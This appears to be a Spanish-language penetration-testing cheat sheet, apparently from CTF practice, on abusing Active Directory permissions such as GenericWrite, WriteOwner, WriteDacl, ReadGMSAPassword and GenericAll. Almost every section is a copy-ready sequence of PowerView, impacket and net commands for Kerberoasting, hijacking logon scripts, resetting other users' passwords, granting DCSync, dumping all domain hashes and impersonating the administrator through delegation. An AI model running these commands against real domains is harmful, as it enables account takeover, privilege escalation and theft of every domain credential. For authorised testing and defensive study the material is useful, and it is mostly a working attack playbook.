## GenericWrite

Gracias a este privilegio sobre un usuario podríamos asignar un SPN (Service Principal Name) a la cuenta:

```powershell
Set-DomainObject -Identity <USUARIO> -SET @{serviceprincipalname='nonexistent/RUY'}
```

Si Kerberos (puerto 88) está abierto, es solo cosa de usar `impacket-GetUserSPNs`, como está explicado en `Ataques a Kerberos`. En caso de que el puerto 88 no esté expuesto, o bien le haces **Port Forwarding** con `chisel` o bien se puede hacer con la siguiente instrucción de `powershell`:

```powershell
Get-DomainUser <USUARIO> | Select serviceprinciplename
```

Otra forma de hacerlo es con este comando:

```powershell
setspn -a <SPN>/<DOMINIO> <DOMINIO>\<USUARIO>
```

Después debemos importar el módulo `PowerView` como se explica arriba, ya que `PowerView` tiene `Get-DomainSPNTicket` para hacer `Kerberoasting` attack. Vale, qué pasa? Que esta utilidad te va a pedir credenciales, aunque ya estés logueado, así que tienes que exportar algunas variables:

```powershell
$pass = ConvertTo-SecureString '<CONTRASEÑA>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMINIO>\<USUARIO>', $pass)
Get-DomainSPNTicket -SPN "<SPN>/<DOMINIO>" -Credential $cred
```

Y con esto deberías obtener el hash del usuario sobre el que tienes `GenericWrite`. 

Otra forma de abusar de esto en la que **no** obtienes un hash (por ejemplo una situación en la que la contraseña es robusta) es abusando de los `AD Logon Scripts`. Esto viene a ser a que, suponiendo que el usuario sobre el que tenemos `GenericWrite` está iniciando sesión cada cierto tiempo, si tú puedes controlar atributos y asignas un atributo, podemos hacer como hicimos antes pero en vez de un `serviceprincipalname` configuraremos un `scriptpath`, que será un script en `powershell` que se ejecutará cuando el usuario en cuestión inicie sesión. 
Lo primero que necesitamos es importar el módulo `PowerView`, como hicimos antes.
Una vez hecho esto, definiremos un script de prueba en `PowerShell` a ver si se ejecuta como el usuario al que queremos abusar:

```powershell
echo 'dir C:\Users\Maria\Desktop\ > C:\Users\smith\Documents\output.txt' > test.ps1
```

Ahora la idea es un poco la misma de antes:

```powershell
Set-DomainObject -Identity <USUARIO> -SET @{scriptpath='path\\to\\script.ps1'}
```

Cuando el usuario se conecte podremos ver el archivo `Output.txt`. Y ahora podemos ejecutar comandos como el usuario :)

## WriteOwner

### Sobre un grupo

La idea aquí es hacernos "dueños" del el grupo sobre el que tenemos privilegios `WriteOwner`. Si por ejemplo tenemos `WriteOwner` sobre el grupo `DomainAdmins` podemos hacernos dueños de él y meternos dentro:

```powershell
Set-DomainObjectOwner -Identity "<GRUPO>" -OwnerIdentity <USUARIO>
```

Ahora que somos "dueños" del grupo podemos ejecutar el siguiente comando:

```powershell
Add-DomainObjectAcl -TargetIdentity "<GRUPO>" -Rights All -PrincipalIdentity <USUARIO>
```

Todavía no estamos en el grupo que queremos, en este caso `DomainAdmins`, pero como somos "dueños" simplemente nos podemos agregar:

```powershell
net group "<GRUPO>" <USUARIO> /add /domain
```

Si el usuario el cuál tiene WriteOwner sobre el grupo no pertenece a Remote Management Users, por lo tanto no podemos ejecutar el comando `net`, haremos uso de `Add-DomainGroupMember`:

```powershell
Add-DomainGroupMember -Identity '<GRUPO>' -Members '<USUARIO>' -Credential $cred
```

Ya con esto podemos hacer lo que se nos permita en el grupo.
>Cabe destacar que deberás cerrar la shell y volver a entrar.

### Sobre un usuario

En caso de tener este derecho sobre un usuario y no un grupo, la cosa cambia un poco, muy poquito, ya que al hacernos dueños del usuario podemos cambiarle la contraseña:

```powershell
Set-DomainObjectOwner -Identity "<USUARIO1>" -OwnerIdentity <USUARIO2>
```

```powershell
Add-DomainObjectAcl -TargetIdentity "<USUARIO1>" -Rights ResetPassword -PrincipalIdentity <USUARIO2>
 ```

Ahora con `SetDomainUserPassword` podemos cambiar la contraseña, pero antes necesitaremos crear una variable que contenga esta:

```powershell
$cred = ConvertTo-SecureString "P@$$w0rd!" -AsPlainText -Force
```

Ahora bien, podemos hacer uso de la utilidad de `PowerView`:

```powershell
Set-DomainUserPassword -Identity <USUARIO> -AccountPassword $cred
```

## ForceChangePassword

>Para esto es imprescindible estar en el grupo `Domain Admins` o bien tener el privilegio `ForceChangePassword` sobre un usuario. Cabe destacar que recomiendo hacerlo desde tu máquina atacante ya que suele fallar menos. También si tenemos `Generic All` sobre el usuario, claro está.

### Desde Linux (máquina atacante):

```shell
net rpc password <USUARIO1> -U '<DOMINIO>/<USUARIO2>%<NT_HASH>' -S <HOSTNAME>.<DOMINIO> --pw-nt-hash
```

```shell
net rpc password <USUARIO1> -U '<DOMINIO>/<USUARIO2>%<CONTRASEÑA>' -S <HOSTNAME>.<DOMINIO>
```

>`USUARIO1`: Usuario al que le vas a modificar la contraseña
>`USUARIO2`: Usuario sobre el que tienes credenciales

### Desde Windows (máquina víctima)

A diferencia de Linux aquí no podemos usar el hash NT del usuario sobre el que tenemos control, tenemos o bien que autenticarnos por **WinRM** si es que solo tenemos el hash o bien si es que podemos ejecutar comandos como el usuario con `Invoke-Command`; de todas formas el comando no varía:

```powershell
net user Administrator password#123
```

Aunque otra cosa que es funcional es añadir a un usuario al grupo `Administrators`:

```powershell
net group Administrators <USUARIO> /domain /add
```

También se puede hacer desde powershell, con el módulo [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1):

```powershell
Import-Module .\PowerView.ps1
```

```powershell
$newpass = ConvertTo-SecureString '<CONTRASEÑA>' -AsPlainText -Force
```

```powershell
Set-DomainUserPassword -Identity <USUARIO> -AccountPassword $newpass
```

## ReadGMSAPassword

Primero debemos tener este privilegio sobre otro usuario. Esto se puede mirar con `BloodHound`. 
- Primero necesitamos obtener la contraseña del usuario en cuestión:

```powershell
$GMSA = (Get-ADServiceAccount -Identity <'USUARIO'> -Properties 'msDS-ManagedPassword').'msDS-ManagedPassword'
```

- Ahora definimos la variable `$SecurePassword`:

```powershell
$SecPassword = (ConvertFrom-ADManagedPasswordBlob $GMSA).SecureCurrentPassword
```

- Y después definimos `$Cred`:

```powershell
$Cred = New-Object System.Management.Automation.PSCredential '<DOMINIO>\<USUARIO>', $SecPassword
```

Si todo va correctamente deberíamos poder ejecutar comandos como el usuario en cuestión:

```powershell
Invoke-Command -ComputerName <HOSTNAME> -Credential $Cred -Command { <COMMAND> }
```

Cabe destacar que no tenemos porqué hacerlo manual, existen herramientas como [gMSADumper](https://github.com/micahvandeusen/gMSADumper) que nos automatizan esto:

```shell
python3 gMSADumper.py -u '<USUARIO>' -p '<CONTRASEÑA>' -d <DOMINIO> -l <DOMINIO_LDAP>
```

>En el dominio **LDAP** (`-l`) puedes poner simplemente le dominio normal ya que no es común tener otro dominio aparte para solamente **LDAP**.

Ejecutando esto nos devolverá el hash NT del usuario sobre el que tenemos privilegios de `ReadGMSAPassword`, el cual podemos comprobar si es válido con `crackmapexec`. 

## WriteDacl

### Sobre un grupo

Esto es una tontería, es simplemente con el comando `net` que nos podemos añadir al grupo sobre el que tenemos este derecho:

```powershell
net group <GRUPO> <USUARIO> /add 
```

Lo mismo pasa con el derecho **WriteOwner**, no se actualiza correctamente así que cierra la sesión (WinRM o SSH) y vuleve a entrar.
También nos podemos asignar DCSync usando el módulo `PowerView`. Antes necesitaremos haber exportado una variable `$cred` como se explica en el archivo `PowerShell things`:

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMINIO>,DC=<.LOCAL,.COM,.HTB, etc" -PrincipalIdentity <USUARIO> -Rights DCSync
```

## ReadLAPSPassword

Teniendo este derecho sobre un usuario/grupo, podemos usar la herramienta `ldapsearch`:

```shell
ldapsearch -x -H ldap://<IP> -D <USUARIO>@<CONTRASEÑA> -w '<CONTRASEÑA>' -b "dc=<DOMINIO>,dc=<:LOCAL,.COM,.HTB>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

## DCSync

Vamos a usar `impacket-secretsdump`:

```shell
impacket-secretsdump <DOMINIO>/<USUARIO>@<HOSTNAME>.<DOMINIO>
```

Después nos pedirá la contraseña del usuario y podremos ver todos los hashes del dominio, incluido el de Administrator.

## GenericAll

Si tenemos `GenericAll` sobre un usuario, o pertenecemos a un grupo que tiene esto sobre un usuario/grupo/ordenador, podemos escalar privilegios de esta forma:

### Sobre ordenador

>Antes debemos importar `PowerView.ps1` y [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)

```powershell
New-MachineAccount -MachineAccount ruycr4ft -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

Ahora comprobamos que se haya creado:

```powershell
Get-DomainComputer ruycr4ft
```

Y ahora:

```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <HOSTNAME> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Ahora comprobamos:

```powershell
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

Con esto definido, jugaremos con `impacket-getST`. Cabe destacar que todo lo anterior se puede conseguir con `impacket-addcomputer` y `impacket-rbcd`:

```shell
getST.py -spn cifs/<HOSTNAME>.<DOMINIO> -impersonate administrator -dc-ip <IP> <DOMINIO>/COMPUTER$:123456
```

Y nos conectamos con `psexec`:

```shell
psexec.py -n -k <DOMINIO>/administrator@<HOSTNAME>.<DOMINIO> cmd.exe
```

### Sobre usuario

Desde nuestra máquina:

```shell
net rpc password <USUARIO_A_PWNEAR> -U '<DOMINOI>/<USUARIO_PWNEADO>%<CONTRASEÑA>' -S <HOSTNAME>.<DOMINIO>
```

Desde la máquina windows:

```powershell
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString '<CONTRASEÑ>' -AsPlainText -Force
Set-DomainUserPassword -Identity <USUARIO> -AccountPassword $pass
evil-winrm -i <IP> -u <USUARIO> -p <CONTRASEÑA>
```

## GetChangesAll

Esto viene a ser que podemos usar `secretsdump` para efectuar un DCSync attack:

```shell
impacket-secretsdump <DOMINIO>/<USUARIO>:'<CONTRASEÑA>'@<HOSTNAME>.<DOMINIO>
```



